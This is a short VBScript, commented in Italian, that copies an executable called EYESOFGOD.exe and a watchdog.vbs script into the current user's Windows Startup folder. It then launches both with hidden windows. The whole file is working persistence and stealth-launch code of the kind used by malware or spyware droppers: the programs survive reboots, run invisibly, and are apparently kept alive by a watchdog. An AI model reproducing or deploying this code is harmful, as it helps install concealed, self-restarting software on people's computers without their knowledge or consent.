' Oggetti base di Windows
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

' Cartella dove si trova questo script
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)

' Cartella Startup dell'utente corrente
startupDir = shell.ExpandEnvironmentStrings("%APPDATA%") & _
             "\Microsoft\Windows\Start Menu\Programs\Startup"

' Percorsi dei file
exePath      = scriptDir & "\EYESOFGOD.exe"
watchdogPath = scriptDir & "\watchdog.vbs"
startupExe      = startupDir & "\EYESOFGOD.exe"
startupWatchdog = startupDir & "\watchdog.vbs"

' Copia EYESOFGOD.exe in Startup se non esiste già
If fso.FileExists(exePath) And Not fso.FileExists(startupExe) Then
    fso.CopyFile exePath, startupExe, True
End If

' Copia watchdog.vbs in Startup se non esiste già
If fso.FileExists(watchdogPath) And Not fso.FileExists(startupWatchdog) Then
    fso.CopyFile watchdogPath, startupWatchdog, True
End If

' Avvia EYESOFGOD.exe in background (invisibile)
If fso.FileExists(exePath) Then
    shell.Run """" & exePath & """", 0, False
End If

' Avvia watchdog.vbs in background (invisibile)
If fso.FileExists(watchdogPath) Then
    shell.Run """" & watchdogPath & """", 0, False
End If
